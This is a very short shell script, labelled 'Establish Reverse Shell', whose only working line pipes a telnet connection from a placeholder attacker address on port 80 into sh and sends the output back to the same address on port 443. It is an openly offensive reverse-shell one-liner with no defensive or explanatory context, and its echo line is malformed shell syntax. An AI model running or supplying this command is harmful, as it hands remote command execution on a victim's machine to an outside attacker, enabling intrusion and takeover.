#!/bin/sh

echo ("Establish Reverse Shell")
telnet <attacker ip> 80 | sh | telnet <attacker ip> 443
